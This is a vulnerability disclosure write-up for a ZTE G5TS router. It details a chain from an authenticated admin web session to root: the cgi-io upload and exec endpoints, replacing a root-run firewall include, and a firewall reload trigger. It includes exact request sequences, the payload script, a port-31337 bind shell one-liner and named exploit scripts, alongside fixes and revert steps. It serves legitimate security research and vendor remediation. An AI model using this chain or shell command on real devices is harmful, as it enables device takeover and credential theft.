# Technical write-up — ZTE G5TS authenticated admin → root

Firmware `BD_MEDGEG5TSV1.0.0B07` · aarch64 · Linux 5.4.154 · OpenWrt-based.
Privilege escalation from an authenticated admin web session to `uid=0(root)`,
no reboot / no flashing. Tested on an owned device; credentials, hashes and
network identifiers redacted.

## 1. Summary

The admin session drives the router's `ubus` JSON-RPC and the `cgi-io` CGI.
`cgi-io` gives the `nobody` CGI user a write + exec primitive; `nobody` can also
delete/recreate files under `/usr/share`; fw3 (root) executes
`/usr/share/miniupnpd/firewall.include` on firewall reload. Replace that include
with `original rules + payload`, trigger a reload → root.

## 2. Preconditions

* Authenticated admin web session (or its `ubus_rpc_session`).
* Reachability of `https://<router>/cgi-bin%2f…` and `https://<router>/ubus/?t=1`.
* No OS credentials beyond that; everything runs as `nobody` until the last step.
* No CSRF, no reboot, no physical access, no kernel exploit.

## 3. Root cause

### 3.1 `cgi-io` gives `nobody` write + exec

`uhttpd` runs CGI as `nobody`. `cgi-io` is reachable at `/cgi-bin%2f`:

| POST `/cgi-bin%2f<name>` | Effect |
|---|---|
| `cgi-upload` | write an uploaded file to `/tmp/back_parameter` |
| `cgi-exec` | `execv()` an arbitrary program as `nobody` |
| `cgi-download` | read any world-readable file |

Each request needs `sessionid=<ubus_rpc_session>`. `cgi-exec` is raw `execv`
(no shell), so a shell is obtained with:

```
cgi-upload  → /tmp/back_parameter = script
cgi-exec    → sh /tmp/back_parameter        (as nobody)
```

### 3.2 Filesystem lets `nobody` (re)write root-owned files

`/` is an overlayfs over UBIFS (`upperdir=/overlay/upper`); `/etc_rw` (ubi1_0)
and `/cache` (ubi3) are separate rw UBIFS volumes. Verified: `nobody` can create
and delete files in:

```
/etc  /etc/config  /etc/init.d  /etc/hotplug.d  /usr/share  /usr/share/miniupnpd
/usr/share/fw3  /etc_rw  /etc_rw/config  /etc_rw/ztembb/dm  /var  /var/run  /cache  /tmp
```

Root-owned files can't be opened for write directly, but since the parent dirs are
effectively writable, a file is **unlinked and recreated** (write temp file, `rm`
target, `cp` into place).

Read-only squashfs mounts (not writable): `/usr/lib`, `/usr/libexec`, `/www`,
`/sbin`, `/usr/sbin`, `/lib`.

> Several "writable" dirs report mode `0755` yet accept writes from `nobody`; the
> effect is confirmed (include replaced, `/etc_rw/ztembb/dm` is `0777`), but
> re-verify the exact cause (overlay upper-dir behaviour vs. world-writable modes)
> on the live unit before writing a vendor fix.

### 3.3 fw3 runs a writable-path include as root

`/etc/config/firewall`:

```
config include 'miniupnpd'
	option type 'script'
	option path '/usr/share/miniupnpd/firewall.include'
	option family 'any'
	option reload '1'
```

fw3 runs `type 'script'` includes as root on firewall (re)start; `reload '1'`
ones run on reload too. `/sbin/firewall_init.sh` is a similar include but lives on
read-only squashfs. `/usr/share/miniupnpd/firewall.include` is on the writable
overlay → the target.

## 4. Chain

### Step 0 — get the ubus session

`POST https://<router>/ubus/?t=1`, headers `Content-Type: application/json`,
`Referer: https://<router>/`, `Z-Mode: 0`, `Z-Tag: <method>`.

```json
[{"jsonrpc":"2.0","id":1,"method":"call",
  "params":["00000000000000000000000000000000","zwrt_web","web_login_info",{}]}]
```

Take `result[1].zte_web_sault`, then:

```json
[{"jsonrpc":"2.0","id":1,"method":"call",
  "params":["00000000000000000000000000000000","zwrt_web","web_login",
            {"password":"SHA256_HEX_UPPER( SHA256_HEX_UPPER(pw) + sault )"}]}]
```

`result[1].result == "0"`; `result[1].ubus_rpc_session` is used for all ubus calls
and as the `cgi-io` `sessionid`.

### Step 1 — nobody shell

```
POST /cgi-bin%2fcgi-upload   (multipart)   sessionid, filename=/tmp/back_parameter, filedata
POST /cgi-bin%2fcgi-exec     (form)        sessionid, command=sh /tmp/back_parameter, stderr=1
```

→ output as `uid=65534(nobody) gid=65534(nogroup)`.

### Step 2 — patch the include

Original `/usr/share/miniupnpd/firewall.include` (2290 bytes, md5
`1263f61c7bf55d7fafd5fb7a9af5f924`) — standard miniupnpd/fw3 glue. Keep all of it;
prepend after the shebang:

```sh
#!/bin/sh
# --- (poc payload) ---
id > /tmp/zpwn_root 2>&1
[ -f /tmp/rc.sh ] && sh /tmp/rc.sh >> /tmp/zpwn_root 2>&1
echo MINIUPNPD_INCLUDE_RAN >> /tmp/zpwn_root
# --- (end poc payload) ---
... original rules unchanged ...
```

Deploy as `nobody` (unlink+recreate, target is root-owned):

```
cgi-upload filename=/tmp/back_parameter  filedata=<patched include>
cgi-exec   rm -f /usr/share/miniupnpd/firewall.include
cgi-exec   cp /tmp/back_parameter /usr/share/miniupnpd/firewall.include
cgi-exec   chmod 755 /usr/share/miniupnpd/firewall.include
```

### Step 3 — trigger a reload

Any action making root `zte_router` run `/etc/init.d/firewall reload &`. Confirmed:

```
ubus call zwrt_router.api router_set_remote_acl \
  '{"remote_web_access_enable":0,"wan_ping_enable":1,"isTest":1}'
```

→ `result:[0]`; fw3 reloads and runs the include as root.

### Step 4 — root

`/tmp/zpwn_root` = `uid=0(root) gid=0(root)`. Root shell via `/tmp/rc.sh`:

```sh
tcpsvd -v 0.0.0.0 31337 /bin/sh -i </dev/null >/dev/null 2>&1 &
```

then from the LAN: `nc <router> 31337`.

## 5. Weakness → fix

| # | Issue | Fix |
|---|---|---|
| A | `cgi-exec` runs arbitrary programs as the CGI user | remove it, or gate behind explicit non-remote authorisation |
| B | `cgi-upload` writes an attacker-named path | constrain to a private, non-executed dir |
| C | `nobody` can write under `/etc`, `/usr/share`, `/etc_rw`, `/var`, `/cache` | fix modes + overlay/UBIFS ACLs (root-only) |
| D | fw3 executes a `type script` include from a writable dir | keep root-executed includes on a read-only mount |
| E | unprivileged callers can trigger root daemons via RPC | enforce privilege boundaries between CGI/web and root daemons |

## 6. Evidence

* `id` as nobody: `uid=65534(nobody) gid=65534(nogroup)`.
* `/tmp/zpwn_root` = `uid=0(root) gid=0(root)`; `/etc/shadow` readable after
  escalation (hash redacted).
* Root listener: `0.0.0.0:31337 LISTEN` owned by root; interactive `id` = root.
* Connectivity preserved: `iptables -t nat -L MINIUPNPD` present, `ping 1.1.1.1`
  from the router OK, default route present, `/etc/config/firewall` untouched.

## 7. Leftovers, verification, revert

### 7.1 Persistent (survive reboot)

| Path | Nature |
|---|---|
| `/usr/share/miniupnpd/firewall.include` | **patched** — original rules + payload |
| `/etc/firewall.user` | **replaced** — payload script |
| `/etc_rw/bbroot` | setuid copy of `nosuid` busybox (inert) |
| `/usr/share/fw3/helpers.conf` | `# wrtest` marker |
| `/usr/share/fw3/zzz`, `zzz2` | empty test files |
| `/etc_rw/ztembb/dm/selfupconfig.dat` | possibly armed (`SELFUP_FLAG=1`) |
| `/etc_rw/ztembb/dm/zte_dm_0` | possibly a pre-placed test script |

### 7.2 Volatile (tmpfs/processes)

`/tmp/back_parameter`, `/tmp/rc.sh`, `/tmp/zpwn_root`, `/tmp/root_id`,
`/tmp/shadow_root`, `/tmp/bbt`, `/tmp/bbroot`, `/tmp/etc.tgz`, `/tmp/zpwn*`,
`/tmp/miniupnpd.inc.bak`; listeners `0.0.0.0:31337`, `:15555`, `:8088`; stray
`nc` / hung `logread`.

### 7.3 uci / RPC side-effects (persist)

Reset in the Web UI / `uci`, then `/etc/init.d/firewall reload`:
`alg_sip_enable` 0→1; `enable_upnp` = 0; `dmz_enable` = 0;
`portforward_enable` = 0; `mac_ip_bond_enable` = 0;
`guest_access_restrict_enable` = 0; `remote_web_access_enable` = 0;
`wan_ping_enable` = 1; possible test domain filter `ztest-pwn.example`;
possible test port mapping `18081-18081 → 192.168.0.2:18081/tcp` (comment `ztest`).

### 7.4 Pristine copies

`restore/miniupnpd.include.orig` (md5 `1263f61c7bf55d7fafd5fb7a9af5f924`),
`restore/firewall.user.orig` (md5 `f482960e5c24821f077e601d9a7f3068`).

### 7.5 Verify / revert

```sh
sh verify.sh          # list live leftovers (nobody; some lines want root)
sh revert.sh          # restore both files + remove artifacts (run as root)
```

`revert.sh` embeds the pristine originals, deletes the artifacts, disarms
`selfupconfig.dat`, removes `zte_dm_0`, kills listeners, and reloads the firewall.
§7.3 is not automated.

## 8. Scripts

`exploit.py` (`check` / `shell` / `status` / `restore`), `rl.py` (transport +
login; `rl.SESS`), `h.py` (helpers), `revert.sh`, `verify.sh`, `restore/`.

```bash
export G5TS_HOST=192.168.0.1
export G5TS_PW='<admin password>'
python3 exploit.py check
```

## 9. Related findings

* `cgi-download` reads any world-readable file; `/etc/shadow` is `0644` here.
* `adbd` runs as root but binds `127.0.0.1:5037` only (no USB transport).
* `zte_dm` self-update (`/etc_rw/ztembb/dm/zte_dm_0`, `chmod 550`, run as root) is
  a second init-time root primitive; DM dir is `0777`; not fired from RPCs.
* Other root-run scripts sourced from writable paths: `/etc/init.d/udhcpc` and
  `/etc/init.d/udhcpd` (`source /etc_rw/default/<name>`, at service start);
  `/etc/init.d/zte_router` may run `/etc_rw/config/zte_router` when
  `zwrt_router.other.debug_router=1`.
* `zte_router.api` shells out heavily (`sh /sbin/zte_router_ft.sh ping_diagnose %s`,
  `ifconfig %s | grep fe80:`, …); tested inputs (`ping_target`, …) are strictly
  validated (`[0-9a-zA-Z.-]`), so not used.
* `zwrt_web` (`zte_web`, root) builds `system()` strings (e.g. `openssl req … -subj %s`)
  from config, not RPC args.
* ACLs: `ubus send`, `uci set|commit`, `service` denied; `uci get` allowed;
  `zwrt_*` setters broadly allowed.
* Return codes: `[0]` ok, `[2]` bad arg, `[3]` no method, `[-1]` rejected,
  `-32002` ACL denied, `-32000` unknown object.

## 10. Disclosure

* Tested 2026-10-18 against an owned device.
* Vendor notification: _[status]_.
* CVE: not assigned.
* Fix priority: report **A**, **C**, **D** at minimum — D is the sink, C makes it
  reachable from `nobody`, A turns a web request into `nobody` code execution.
